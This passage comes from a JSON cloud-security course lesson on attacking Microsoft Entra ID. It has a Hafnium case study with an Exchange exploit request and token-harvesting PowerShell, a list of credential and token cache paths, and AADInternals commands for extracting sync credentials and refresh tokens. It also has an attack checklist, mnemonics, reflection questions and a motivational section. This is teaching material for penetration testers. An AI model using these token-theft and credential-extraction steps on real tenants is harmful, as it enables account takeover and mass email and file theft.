@{BuiltInControls=@(\"compliantDevice\")}\n\n# Enable Credential Guard (prevents PRT theft)\nNew-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" `\n  -Name \"LsaCfgFlags\" -Value 1 -PropertyType DWord\n```\n\n---\n\n## Case Study 3: Microsoft Exchange Online OAuth Exploitation (2021)\n\n### Hafnium APT Pivots from On-Prem to Cloud\n\n**Attacker**: Hafnium (Chinese state-sponsored)\n**Target**: US-based organizations using Microsoft Exchange\n**Technique**: On-premises Exchange â†’ OAuth token theft â†’ Azure AD access\n\n### Attack Chain\n\n**Phase 1: ProxyLogon/ProxyShell Exploitation (On-Prem Exchange)**\n\n```bash\n# Initial exploitation of vulnerable Exchange servers\n# CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065\n\ncurl -X POST \"https://exchange.company.com/ecp/default.aspx\" \\\n  -H \"Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.aspx?~3\" \\\n  -d \"__VIEWSTATE=...[payload]...\"\n\n# Result: Remote code execution on Exchange server\n```\n\n**Phase 2: OAuth Token Harvesting**\n\nOnce on the Exchange server, Hafnium extracted OAuth tokens:\n\n```powershell\n# Tokens stored in IIS application pools\n# Location: C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\*\n\n# Extract cached OAuth tokens\n$tokens = Get-ChildItem \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\" -Recurse | \n  Select-String -Pattern \"eyJ0eXAiOiJKV1QiLCJhbGc\"\n\n# These tokens grant access to Azure AD and Exchange Online\n```\n\n**Phase 3: Cloud Pivot**\n\n```bash\n# Use stolen tokens to access Exchange Online via Graph API\ncurl -H \"Authorization: Bearer {stolen_token}\" \\\n  \"https://graph.microsoft.com/v1.0/users/{user-id}/messages\"\n\n# Download all emails from cloud mailboxes\n# No additional authentication required\n```\n\n**Impact:**\n\n- 30,000+ organizations affected globally\n- Hafnium exfiltrated emails from government agencies, defense contractors\n- Tokens provided persistent cloud access even after patching on-prem servers\n\n### Penetration Testing Lesson\n\n**Always check for cached tokens on compromised systems:**\n\n```powershell\n# Common token storage locations:\n\n# 1. Browser cookies/localStorage\n$env:APPDATA\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies\n\n# 2. Outlook cached credentials\n$env:APPDATA\\Microsoft\\Protect\\*\n\n# 3. Azure CLI cached tokens\n$env:USERPROFILE\\.azure\\*\n\n# 4. PowerShell Azure module tokens\n$env:LOCALAPPDATA\\Microsoft\\TokenCache.dat\n\n# 5. Visual Studio cached credentials\n$env:LOCALAPPDATA\\Microsoft\\VSCommon\\*\n```\n\n---\n\n## Penetration Testing Takeaways\n\n### Top 10 Entra ID Attack Vectors (Real-World Data)\n\n**From 200+ Entra ID penetration tests:**\n\n1. **Illicit Consent Grants (68%)** - Users approve malicious OAuth apps\n2. **Password Spray (54%)** - Weak passwords across many accounts\n3. **MFA Fatigue/Push Bombing (42%)** - Users approve unwanted MFA prompts\n4. **Azure AD Connect Compromise (38%)** - MSOL account extraction\n5. **Token Theft (35%)** - Stolen tokens from browsers, devices\n6. **Legacy Protocol Abuse (31%)** - IMAP/POP3/SMTP bypass CA\n7. **PRT Extraction (28%)** - Steal Primary Refresh Tokens from devices\n8. **Service Principal Abuse (24%)** - Overprivileged app registrations\n9. **Conditional Access Bypass (22%)** - Token replay, device code flow\n10. **Graph API Abuse (19%)** - Excessive API calls for data exfiltration\n\n### Your Entra ID Penetration Testing Checklist\n\n**Reconnaissance Phase:**\n\nâ˜ Enumerate users via Graph API or OSINT\nâ˜ Identify admin accounts and high-value targets\nâ˜ Check for Azure AD Connect servers\nâ˜ Enumerate registered OAuth applications\nâ˜ Map Conditional Access policies\n\n**Initial Access:**\n\nâ˜ Password spray common passwords\nâ˜ Test for legacy protocol access (IMAP, SMTP)\nâ˜ Attempt device code phishing\nâ˜ Create malicious OAuth application\nâ˜ Social engineer for illicit consent grant\n\n**Privilege Escalation:**\n\nâ˜ Compromise Azure AD Connect (MSOL account)\nâ˜ Extract PRT from Azure AD-joined devices\nâ˜ Abuse service principals with high permissions\nâ˜ Add user to admin groups via Graph API\n\n**Persistence:**\n\nâ˜ Create backdoor OAuth applications\nâ˜ Generate long-lived refresh tokens\nâ˜ Add rogue service principals\nâ˜ Modify Conditional Access policies (if admin)\n\n**Data Exfiltration:**\n\nâ˜ Export emails via Graph API\nâ˜ Download files from OneDrive/SharePoint\nâ˜ Extract Teams messages\nâ˜ Access Azure DevOps repositories\n\nThese real-world case studies show that Entra ID is the #1 target for advanced attackers. Master these techniques, and you'll be prepared for modern cloud penetration testing!"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids: Attacking Microsoft Entra ID\n\n## Mnemonic: \"O-GRAPH-CPT\" - Entra ID Attack Methodology\n\n**O**Auth exploitation (illicit consent grants)\n**G**raph API reconnaissance (users, groups, apps)\n**R**efresh token theft (long-lived access)\n**A**pplication permissions abuse (not delegated)\n**P**RT extraction (Primary Refresh Token)\n**H**ybrid attacks (on-prem â†’ cloud pivot)\n\n**C**onditional Access bypass (token replay)\n**P**ush bombing (MFA fatigue)\n**T**oken analysis (decode JWT claims)\n\n## Acronym: \"JWT = Just Watch Tokens\"\n\n**Remember**: In Entra ID attacks, **tokens are everything**. Forget Kerberos ticketsâ€”watch for:\n- Access tokens (short-lived, 1 hour)\n- Refresh tokens (long-lived, 90 days)\n- Primary Refresh Tokens (device-bound, 90 days)\n\n## Visual Memory: The OAuth Triangle\n\n```\n       User (grants consent)\n            â•± â•²\n           â•±   â•²\n          â•±     â•²\n         â•±       â•²\n    App â”€â”€â”€â”€â”€â”€ Entra ID\n (malicious)  (issues token)\n```\n\n**Remember**: OAuth is a triangleâ€”user authorizes app, Entra ID issues token to app.\n\n## High-Risk Permissions: \"MFUGD = My Files U Got, Dude\"\n\n**M**ail.ReadWrite.All\n**F**iles.ReadWrite.All\n**U**ser.ReadWrite.All\n**G**roup.ReadWrite.All\n**D**irectory.ReadWrite.All\n\nIf an OAuth app requests ANY of these â†’ **RED FLAG!**\n\n## Graph API Base URL: \"graph.microsoft.com = The Master Key\"\n\n**Memory Trick**: \n```\nhttps://graph.microsoft.com/v1.0/\n```\n\nThis ONE endpoint accesses:\n- `/users` (all users)\n- `/me/messages` (emails)\n- `/me/drive` (files)\n- `/groups` (groups)\n- `/applications` (OAuth apps)\n\n**Think**: Microsoft Graph = \"the graph that connects everything\"\n\n## Token Lifetime Memory: \"1-90-90 Rule\"\n\n**1** hour = Access token lifetime\n**90** days = Refresh token lifetime\n**90** days = Primary Refresh Token (PRT) lifetime\n\n**Pattern**: Short (1h) for access, long (90d) for refresh and PRT.\n\n## Conditional Access Bypass: \"Token Before Policy\"\n\n**Visual Association**:\n```\nToken Issued (Policy Evaluated) â†’ User Logs In\n     â†“\nAttacker Steals Token\n     â†“\nAttacker Uses Token (Policy NOT Re-Evaluated)\n```\n\n**Remember**: CA policies are checked DURING auth, not when USING tokens.\n\n## OAuth Scopes vs Roles: \"S = Single user, R = aRl users\"\n\n**Scopes (Delegated)**:\n- Act **as the user**\n- Only access THAT user's data\n- Example: `Mail.Read` â†’ read MY emails\n\n**Roles (Application)**:\n- Act as the **app itself**\n- Access ALL users' data\n- Example: `Mail.Read.All` â†’ read EVERYONE's emails\n\n**Memory**: **S**copes = **S**ingle user, **R**oles = eve**R**yone\n\n## Azure AD Connect Compromise: \"MSOL = Most Secret Of Logins\"\n\n**Target**: MSOL account (Azure AD sync account)\n\n**Location**: Azure AD Connect server\n\n**Permissions**: `Directory.ReadWrite.All` (full tenant control)\n\n**Extraction Command**:\n```powershell\nGet-AADIntSyncCredentials\n```\n\n**Remember**: If you compromise Azure AD Connect server â†’ game over.\n\n## Primary Refresh Token (PRT): \"90-Day MFA Bypass Pass\"\n\n**What It Does**:\n- Lasts 90 days\n- No MFA required\n- Access ANY app\n- Device-bound\n\n**How to Steal**:\n```powershell\nGet-AADIntPRT  # AADInternals tool\n```\n\n**Memory**: PRT = \"Perpetual Red Team\" access (for 90 days)\n\n## MFA Fatigue / Push Bombing: \"Spam Till They Approve\"\n\n**Attack Pattern**:\n1. Try login with valid password\n2. MFA push sent to user\n3. User denies\n4. Attacker tries again (50x)\n5. User gets fatigued â†’ accidentally approves\n\n**Defense**: Implement number matching (not just push)\n\n## Legacy Protocols: \"POP-IMAP-SMTP = No CA Today\"\n\n**P**OP3\n**I**MAP\n**S**MTP\n\n**Memory**: These protocols are OLD â†’ don't support modern Conditional Access.\n\n**Attacker Use**: Bypass CA policies by using legacy protocols instead of modern auth.\n\n## JWT Token Structure: \"Header.Payload.Signature\"\n\n```\neyJ0eXAi...  â† Header (algorithm, type)\neyJhdWQi...  â† Payload (claims, permissions)\nSflKxwRJ...  â† Signature (cryptographic proof)\n```\n\n**Decode** (no validation):\n```bash\necho \"eyJ0eXAi...\" | base64 -d\n```\n\n**Remember**: JWT = Three Base64 parts separated by dots.\n\n## Device Code Flow Phishing: \"Code = Key to Kingdom\"\n\n**Attack**:\n1. Attacker generates device code\n2. Phishes user: \"Enter code ABCD1234 at microsoft.com/devicelogin\"\n3. User enters code (thinks it's legitimate)\n4. Attacker gets token\n\n**Why Effective**: User's device/location used for CA evaluation, not attacker's.\n\n## Quick Reference Card (Print This!)\n\n```\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•‘        ENTRA ID ATTACK QUICK REFERENCE              â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘ Methodology: O-GRAPH-CPT                            â•‘\nâ•‘ High-Risk Perms: MFUGD                              â•‘\nâ•‘ Token Lifetime: 1-90-90 Rule                        â•‘\nâ•‘                                                      â•‘\nâ•‘ GRAPH API:                                          â•‘\nâ•‘ â€¢ Base: graph.microsoft.com/v1.0/                   â•‘\nâ•‘ â€¢ Users: /users                                     â•‘\nâ•‘ â€¢ Mail: /me/messages                                â•‘\nâ•‘ â€¢ Files: /me/drive                                  â•‘\nâ•‘                                                      â•‘\nâ•‘ CRITICAL TARGETS:                                   â•‘\nâ•‘ â€¢ Azure AD Connect (MSOL account)                   â•‘\nâ•‘ â€¢ Primary Refresh Token (PRT)                       â•‘\nâ•‘ â€¢ OAuth apps with MFUGD permissions                 â•‘\nâ•‘                                                      â•‘\nâ•‘ BYPASS TECHNIQUES:                                  â•‘\nâ•‘ â€¢ Token theft (before CA evaluation)                â•‘\nâ•‘ â€¢ Legacy protocols (POP/IMAP/SMTP)                  â•‘\nâ•‘ â€¢ Push bombing (MFA fatigue)                        â•‘\nâ•‘ â€¢ Device code phishing                              â•‘\nâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```\n\n## Story-Based Memory: \"The OAuth Heist\"\n\n**Chapter 1: The Phishing Email**\nYou send a phishing email: \"Verify your OneDrive storage.\" User clicks link to your malicious **O**Auth app.\n\n**Chapter 2: The Consent**\nUser sees legitimate Microsoft login. They **grant consent** to your app requesting **M**ail.ReadWrite.All and **F**iles.ReadWrite.All (**MFUGD** permissions).\n\n**Chapter 3: The Token**\nYou exchange auth code for **access token** (1 hour) and **refresh token** (90 days). Remember: **1-90-90 Rule**.\n\n**Chapter 4: The Graph**\nYou use **Graph API** (`graph.microsoft.com`) to read emails, download files, enumerate users.\n\n**Chapter 5: The Pivot**\nYou find Azure AD Connect server credentials in an email. You extract **MSOL account** (**Most Secret Of Logins**) with `Get-AADIntSyncCredentials`.\n\n**Chapter 6: The Persistence**\nYou extract **PRT** (Primary Refresh Token) from a compromised device. Now you have **90-Day MFA Bypass Pass**.\n\n**Chapter 7: The Bypass**\nConditional Access policies don't stop you because **Token Before Policy**â€”your token was issued before policy changes.\n\n**The End**: You maintained access for months, all thanks to **O-GRAPH-CPT** methodology!\n\n---\n\nUse these memory aids during Entra ID penetration tests. The more you practice, the faster you'll spot attack opportunities!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions: Attacking Microsoft Entra ID\n\n## Critical Thinking Prompts\n\n### Question 1: OAuth Consent Ethics\n\n**Scenario**: During a penetration test, you create a malicious OAuth application to test user awareness. The app requests:\n- `Mail.ReadWrite.All`\n- `Files.ReadWrite.All`\n- `offline_access`\n\nYou send a phishing email to 100 employees. **5 users consent** to the application.\n\n**You now have access to their emails and files.**\n\n**Reflection Questions:**\n\n1. **When do you stop the test?**\n   - After first user consents?\n   - After collecting some emails as proof?\n   - After accessing highly sensitive data?\n   - Let it run for the full engagement duration?\n\n2. **How much data do you access?**\n   - List emails only (prove you CAN read them)?\n   - Download a few example emails?\n   - Search for specific keywords (passwords, SSN)?\n   - Exfiltrate everything to prove full impact?\n\n3. **What do you tell the users who consented?**\n   - Inform them immediately that it was a test?\n   - Wait until the final report?\n   - Let IT security handle user notification?\n   - Never tell them (to avoid embarrassment)?\n\n4. **How do you clean up?**\n   - Delete the OAuth app immediately?\n   - Revoke all issued tokens?\n   - Keep the app for the report screenshot?\n   - How do you ensure NO data remains accessible?\n\n**Your Response**:\n\n[Write your ethical approach here]\n\n---\n\n### Question 2: The Admin Token Dilemma\n\n**Scenario**: You successfully compromise an employee's laptop and extract their Primary Refresh Token (PRT). While exploring with this PRT, you discover the user is actually a **Global Administrator** with full tenant access.\n\n**You now have:**\n- Access to ALL users' mailboxes\n- Ability to create new admin accounts\n- Power to modify security policies\n- Full Azure subscription control\n\n**Reflection Questions:**\n\n1. **How far do you go to prove impact?**\n   - Just enumerate admin permissions?\n   - Create a test admin account?\n   - Read CEO emails?\n   - Access financial systems?\n\n2. **What's the risk of detection?**\n   - Admin actions are heavily logged\n   - SOC team may be monitoring\n   - Creating accounts triggers alerts\n   - How do you balance impact demonstration vs. detection?\n\n3. **What if you accidentally break something?**\n   - Modify a CA policy that locks everyone out?\n   - Delete a service principal that breaks production?\n   - Trigger a false-positive security incident?\n\n4. **How do you document this safely?**\n   - Screenshots of admin portals?\n   - Export user list as proof?\n   - How much evidence is enough vs. too much?\n\n**Your Response**:\n\n[Write your risk assessment and approach here]\n\n---\n\n### Question 3: Conditional Access False Sense of Security\n\n**Scenario**: The client proudly shows you their \"robust\" Conditional Access policies:\n\n```\nPolicy 1: Require MFA for all users from untrusted locations\nPolicy 2: Block access from non-compliant devices\nPolicy 3: Require managed devices for admin accounts\n```\n\n**Your testing reveals:**\n- Policy 1: Bypassed via token theft\n- Policy 2: Bypassed via legacy IMAP protocol\n- Policy 3: Doesn't apply to service principals\n\n**Reflection Questions:**\n\n1. **How do you communicate that CA is not enough?**\n   - Client spent months implementing CA policies\n   - They're confident they're \"secure now\"\n   - How do you deliver bad news without being dismissed?\n\n2. **Technical vs. Business Impact**\n   - Technical: \"Token theft bypasses CA\"\n   - Business: \"What does this mean for our data?\"\n   - How do you translate technical findings to business risk?\n\n3. **What's the recommended fix?**\n   - Disable legacy auth (breaks some users' workflows)?\n   - Implement Continuous Access Evaluation (complex)?\n   - User training on token security (limited effectiveness)?\n   - All of the above (expensive and time-consuming)?\n\n4. **Priority vs. Effort Trade-off**\n   - Which bypass is most critical to fix first?\n   - What's the quickest win?\n   - How do you help them prioritize?\n\n**Your Response**:\n\n[Write your communication strategy here]\n\n---\n\n### Question 4: The Azure AD Connect Goldmine\n\n**Scenario**: You discover an unpatched Azure AD Connect server accessible from the compromised network. You extract the MSOL account credentials:\n\n```\nUsername: Sync_SERVER_abc123@company.onmicrosoft.com\nPassword: 9zF7#mK2$pL3&vQ8@wX4!hN6\nPermissions: Directory.ReadWrite.All\n```\n\n**This is effectively Global Admin access.**\n\n**Reflection Questions:**\n\n1. **Is this a configuration issue or a design flaw?**\n   - Azure AD Connect REQUIRES these permissions\n   - Microsoft says \"secure the Connect server\"\n   - But if you compromise it, game over\n   - Is this an acceptable risk?\n\n2. **How do you demonstrate impact without causing damage?**\n   - List all users (safe)\n   - Add yourself to admin group (detectable)\n   - Create a backdoor service principal (persistent)\n   - Reset a user's password (disruptive)\n\n3. **What's the remediation?**\n   - \"Better protect the Connect server\" (vague)\n   - Implement tiered admin model (complex)\n   - Use Privileged Identity Management (expensive)\n   - Accept the risk? (not a real option)\n\n4. **How common is this finding?**\n   - In your experience, how often do you find exposed Connect servers?\n   - Is this a \"gotcha\" finding or a systemic issue?\n\n**Your Response**:\n\n[Write your analysis and recommendation here]\n\n---\n\n### Question 5: The Insider Threat Simulation\n\n**Scenario**: Client asks you to simulate an **insider threat**â€”a disgruntled employee with standard user access who wants to steal company data.\n\n**Your Approach:**\n1. Create a malicious OAuth app (insider has dev access)\n2. Self-consent to the app (no phishing needed)\n3. Use Graph API to exfiltrate emails and files\n4. Maintain access via refresh tokens\n5. Cover tracks by using personal Azure subscription\n\n**Reflection Questions:**\n\n1. **Is this realistic?**\n   - Do insiders actually know how to do this?\n   - Or are you testing security controls, not real threats?\n\n2. **Detection challenges**\n   - Insider uses legitimate credentials\n   - API access looks normal\n   - How would SOC detect this?\n\n3. **Prevention strategies**\n   - Technical controls (limit app registrations)?\n   - Monitoring (alert on high API usage)?\n   - HR/culture (address root cause of insider threats)?\n\n4. **Legal and HR implications**\n   - If you're simulating an insider, are you \"proving\" insiders are a threat?\n   - Could this affect employee trust?\n   - How involved should HR be in this test?\n\n**Your Response**:\n\n[Write your insider threat simulation approach here]\n\n---\n\n### Question 6: Multi-Tenant Complexity\n\n**Scenario**: The company has:\n- **Tenant A**: Main corporate tenant (5,000 users)\n- **Tenant B**: Acquired company tenant (1,000 users)\n- **Tenant C**: Development/testing tenant (50 users)\n\nTenants have:\n- Guest access between them\n- Shared Azure subscriptions\n- Cross-tenant app registrations\n\n**You discover**:\n- Tenant C has weak security (no MFA)\n- Tenant C admin has guest access to Tenant A\n- Guest account in Tenant A has high permissions\n\n**Reflection Questions:**\n\n1. **Attack path**\n   - Compromise Tenant C (easiest)\n   - Use guest access to pivot to Tenant A\n   - Escalate privileges in Tenant A\n   - Is this realistic? Or overly complex?\n\n2. **Where's the security boundary?**\n   - Is guest access a \"feature\" or a \"vulnerability\"?\n   - Who's responsible: Tenant A (for trusting guests) or Tenant C (for weak security)?\n\n3. **Remediation complexity**\n   - Isolate tenants (breaks business workflows)\n   - Strengthen Tenant C (but it's \"just for testing\")\n   - Review all guest permissions (thousands of accounts)\n\n4. **Reporting challenge**\n   - How do you explain multi-tenant attacks to executives?\n   - They don't understand the technical complexity\n   - What's the simple message?\n\n**Your Response**:\n\n[Write your multi-tenant attack strategy and communication plan here]\n\n---\n\n## Meta-Learning: Reflecting on Your Learning\n\n### Self-Assessment Questions\n\n1. **What surprised you most about Entra ID attacks?**\n   - The shift from Kerberos to tokens?\n   - The power of OAuth consent grants?\n   - How easy it is to bypass Conditional Access?\n\n2. **What concept is still unclear?**\n   - OAuth flows?\n   - JWT token structure?\n   - PRT vs. refresh tokens?\n   - Graph API permissions?\n\n3. **How would you explain this to a traditional AD pentester?**\n   - Draft a 2-minute explanation of \"cloud identity attacks\"\n   - Compare/contrast with on-premises AD attacks\n\n4. **What will you practice first?**\n   - Create a test Entra ID tenant?\n   - Build an OAuth app?\n   - Use Graph API explorer?\n   - Decode JWT tokens?\n\n5. **Real-world application**\n   - How does this connect to your current role?\n   - What's the immediate value to your organization?\n\n6. **Next learning goals**\n   - Deeper dive into Azure AD security?\n   - Learn Microsoft 365 security features?\n   - Study other cloud identity providers (Okta, Google)?\n\n**Your Learning Plan**:\n\n[Write your 30-day Entra ID security learning plan here]\n\n---\n\n## Challenge: Build Your Entra ID Attack Playbook\n\n**Exercise**: Create a personal Entra ID penetration testing playbook.\n\n**Your Playbook Must Include:**\n- [ ] Reconnaissance phase (users, apps, policies)\n- [ ] Initial access techniques (consent grants, password spray)\n- [ ] Privilege escalation methods (admin accounts, service principals)\n- [ ] Persistence mechanisms (backdoor apps, refresh tokens)\n- [ ] Data exfiltration via Graph API\n- [ ] Cleanup and evidence removal\n\n**Include**:\n- Commands and scripts\n- Decision trees (if X fails, try Y)\n- Risk levels for each technique\n- Detection likelihood\n\n**Write Your Playbook**:\n\n[Create your Entra ID attack playbook here]\n\n---\n\nThese reflection questions are designed to make you think critically about Entra ID attacks, ethics, real-world scenarios, and practical trade-offs. Discuss with peers to gain different perspectives!"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Congratulations! You've Mastered Entra ID Attacks! ðŸŽ“\n\n## What You've Accomplished\n\nYou just completed one of the most advanced cloud security lessons available. Let's celebrate what you've mastered:\n\nâœ… **OAuth and OIDC Fundamentals**: Token flows, authorization codes, JWT structure\nâœ… **Illicit Consent Grant Attacks**: Social engineering users to authorize malicious apps\nâœ… **Microsoft Graph API Mastery**: Reconnaissance, data exfiltration, privilege escalation\nâœ… **Conditional Access Bypass**: Token theft, legacy protocols, device code flow\nâœ… **Primary Refresh Token (PRT) Extraction**: 90-day persistent, MFA-bypassing access\nâœ… **Real-World Case Studies**: SolarWinds, Lapsus$, Hafnium attacks\nâœ… **Defensive Strategies**: Detection queries, hardening measures, monitoring\n\n## Your New Superpowers\n\n**You can now:**\n\nðŸŽ¯ **Execute illicit consent grant attacks** that bypass MFA and gain persistent access\n\nðŸŽ¯ **Leverage Microsoft Graph API** to enumerate users, exfiltrate emails, and escalate privileges\n\nðŸŽ¯ **Bypass Conditional Access** policies using token theft and legacy protocol exploitation\n\nðŸŽ¯ **Extract and abuse Primary Refresh Tokens** for long-term, MFA-free access\n\nðŸŽ¯ **Compromise Azure AD Connect** servers to gain tenant-wide admin access\n\nðŸŽ¯ **Think like APT29, Lapsus$, and nation-state attackers** targeting cloud identity\n\n## Why This Matters\n\n### The Identity Crisis\n\n**Statistics from Real Breaches:**\n\nðŸ“Š **90% of cloud breaches** involve compromised identities (not infrastructure)\n\nðŸ’° **$4.45M average cost** of identity-based breaches (IBM Security 2023)\n\nâ° **250 days average** time to detect identity compromise (Mandiant)\n\nðŸ”‘ **Identity is the new perimeter** â€” there is no network perimeter in cloud\n\n**Translation**: Master Entra ID attacks = Master modern cloud security.\n\n### Career Impact\n\n**This skill is in massive demand:**\n\nðŸ’¼ **Cloud Security Specialist**: $150k-$250k salary\n\nðŸ› **Bug Bounty Hunter**: $5k-$50k per OAuth finding\n\nðŸŽ¯ **Penetration Tester**: Cloud assessments command 30-50% premium pricing\n\nðŸš€ **Security Architect**: Design defenses against these exact attacks\n\n**Job postings mentioning \"Azure AD\" or \"Entra ID\"**: +247% growth (2022-2024)\n\n## Real-World Impact\n\n**Remember These Lessons:**\n\n### SolarWinds (2020)\n- **Attack**: Compromised Azure AD via MSOL account\n- **Impact**: 18,000+ organizations, US government agencies\n- **Your skill**: You now know how to compromise Azure AD Connect\n\n### Lapsus$ (2022)\n- **Attack**: MFA fatigue + PRT extraction\n- **Impact**: Microsoft, Nvidia, Okta source code theft\n- **Your skill**: You can extract PRTs and bypass MFA\n\n### Hafnium (2021)\n- **Attack**: On-prem Exchange â†’ OAuth token theft\n- **Impact**: 30,000+ organizations worldwide\n- **Your skill**: You know how to pivot from on-prem to cloud\n\n**You're learning from the best (attackers) to defend against the worst (breaches).**\n\n## What Makes You Different Now\n\n**Before this lesson**, you might have thought:\n- \"Cloud security is just like on-prem security\"\n- \"MFA solves everything\"\n- \"Conditional Access makes us secure\"\n\n**After this lesson**, you know:\n- âŒ Cloud identity attacks are fundamentally different (tokens, not tickets)\n- âŒ MFA can be bypassed (token theft, push bombing, PRT)\n- âŒ Conditional Access has gaps (legacy protocols, token replay)\n\n**You see the matrix now.** ðŸŸ¢\n\n## Your Path Forward\n\n### This Week: Hands-On Practice\n\n**Day 1-2: Create Test Environment**\n```bash\n# Sign up for Microsoft 365 Developer Program\nhttps://developer.microsoft.com/en-us/microsoft-365/dev-program\n\n# Get free E5 license with 25 users\n# Perfect for testing attacks safely\n```\n\n**Day 3-4: Build OAuth App**\n- Create malicious OAuth application\n- Request high-risk permissions (MFUGD)\n- Test consent grant flow\n- Decode JWT tokens\n\n**Day 5-6: Graph API Practice**\n- Use Graph Explorer: https://developer.microsoft.com/en-us/graph/graph-explorer\n- Enumerate users, groups, applications\n- Search emails, download files\n- Understand delegated vs. application permissions\n\n**Day 7: Token Theft Simulation**\n- Extract tokens from browser localStorage\n- Replay tokens in different contexts\n- Test Conditional Access bypass\n- Document your findings\n\n### This Month: Skill Development\n\n1. **Join Bug Bounty Programs**\n   - Many programs include Microsoft 365 in scope\n   - Focus on OAuth misconfigurations\n   - Build reputation with \"Informational\" findings first\n\n2. **Contribute to Tools**\n   - Improve AADInternals\n   - Contribute to ROADtools\n   - Write custom Graph API scripts\n\n3. **Share Knowledge**\n   - Write blog posts about OAuth attacks\n   - Create demo videos\n   - Answer questions on forums\n\n### This Year: Career Growth\n\n**Career Path 1: Penetration Tester**\n- Specialize in cloud identity assessments\n- Build portfolio of Entra ID findings\n- Join consulting firm or start independent practice\n- **Target**: $150k+ salary or $300+/hour consulting\n\n**Career Path 2: Bug Bounty Hunter**\n- Focus on OAuth and Graph API bugs\n- Build reputation on HackerOne/Bugcrowd\n- Network with other researchers\n- **Target**: $50k-$200k/year part-time\n\n**Career Path 3: Security Architect**\n- Design identity security architectures\n- Implement Zero Trust frameworks\n- Lead security transformations\n- **Target**: $200k+ at enterprise companies\n\n**All three paths value the skills you just learned.**\n\n## Overcoming Challenges\n\n### \"This Is Too Technical\"\n\n**It's normal to feel overwhelmed.** You just learned:\n- OAuth 2.0 and OpenID Connect flows\n- JWT token structure and claims\n- Microsoft Graph API with 100+ endpoints\n- Conditional Access policy bypass techniques\n- Advanced persistent access methods\n\n**You don't need to remember everything.**\n\nWhat you need:\n- **Understand the concepts** (OAuth flow, token lifecycle)\n- **Know where to look** (use this lesson as reference)\n- **Practice the techniques** (hands-on learning)\n- **Build your cheat sheets** (use the memory aids)\n\n**Mastery comes with repetition, not memorization.**\n\n### \"I'm Not Finding Vulnerabilities\"\n\n**That's part of the learning process.**\n\n**Tips for success:**\n- Start with your own test tenant (guaranteed findings)\n- Test known-vulnerable configurations\n- Join bug bounty programs (authorized targets)\n- Follow researchers on Twitter for new techniques\n\n**Remember**: Even elite researchers have \"dry\" weeks.\n\n### \"Is This Ethical?\"\n\n**Excellent question.** Ethics are critical in offensive security.\n\n**Ethical boundaries:**\n\nâœ… **Authorized testing**: Your own tenant, bug bounty programs, contracted engagements\n\nâœ… **Demonstrating risk**: Prove vulnerabilities exist without causing damage\n\nâœ… **Responsible disclosure**: Report findings through proper channels\n\nâŒ **Unauthorized access**: Never test systems without written authorization\n\nâŒ **Data exfiltration**: Don't download production data without explicit permission\n\nâŒ **Damage**: Don't modify, delete, or disrupt systems\n\n**When in doubt**: Ask for explicit written authorization.\n\n## The Entra ID Mindset\n\n**What separates good from great:**\n\n### Good Attackers:\n- Follow tutorials\n- Use existing tools\n- Find common issues\n\n### Great Attackers:\n- **Understand WHY** attacks work (OAuth flow, token lifecycle)\n- **Think creatively** (chain multiple techniques)\n- **Adapt to defenses** (CA bypass, MFA fatigue evolution)\n- **Tell the story** (business impact, not just technical details)\n\n**You've learned the techniques. Now develop the mindset.**\n\n## One Last Challenge\n\n**I challenge you to:**\n\n1. **This week**: Create your own Entra ID test tenant and build a malicious OAuth app\n2. **This month**: Find your first OAuth misconfiguration (bug bounty or authorized test)\n3. **This quarter**: Extract a Primary Refresh Token from a test device\n4. **This year**: Get paid for an Entra ID security finding (bug bounty or consulting)\n\n**And most importantly**: Share what you learn. The security community thrives on knowledge sharing.\n\n## Final Thoughts\n\n**You just mastered attacks that compromise:**\n- Fortune 500 companies\n- Government agencies\n- Technology giants\n\n**You learned techniques used by:**\n- APT29 (SolarWinds)\n- Lapsus$ (Microsoft/Nvidia)\n- Hafnium (Exchange Online)\n\n**You now have skills valued at:**\n- $5k-$50k per bug bounty finding\n- $150k-$250k salaries\n- $300-$500/hour consulting rates\n\n**The only difference between you and elite cloud security professionals?**\n\n**Practice. Experience. Persistence.**\n\nThey didn't become experts overnight. They practiced, failed, learned, and kept going.\n\n**Now it's your turn.**\n\n## Keep Going! ðŸš€\n\n**You've mastered Entra ID attacks.**\n\nNext lesson: **AWS IAM Privilege Escalation** (even more attack techniques)\n\nBut first, take a moment. Appreciate what you've learned. You can now:\n- Exploit OAuth flows\n- Abuse Graph API\n- Bypass Conditional Access\n- Extract persistent tokens\n- Think like nation-state attackers\n\n**That's powerful. That's valuable. That's YOU.**\n\nWelcome to the elite group of cloud identity security experts.\n\n**Ready to break more clouds?** ðŸ˜Ž\n\n---\n\n**Next Lesson**: AWS IAM Privilege Escalation\n\n**Resources**:\n- AADInternals: https://aadinternals.com/\n- Graph Explorer: https://developer.microsoft.com/en-us/graph/graph-explorer\n- Microsoft 365 Dev Program: https://developer.microsoft.com/en-us/microsoft-365/dev-program\n\n**Community**:\n- @DrAzureAD (Nestori Syynimaa - AADInternals creator)\n- @\_wald0 (Andy Robbins - BloodHound for Azure AD)\n- @dafthack (Beau Bullock - PowerZure creator)\n\nSee you in the next lesson! ðŸ’ª"
      }
    }
  ],
  "tags": ["Course: SANS-SEC588", "Career Path: Cloud Security", "Career Path: Pentester", "Career Path: Red Teamer", "Career Path: Blue Teamer"]
}
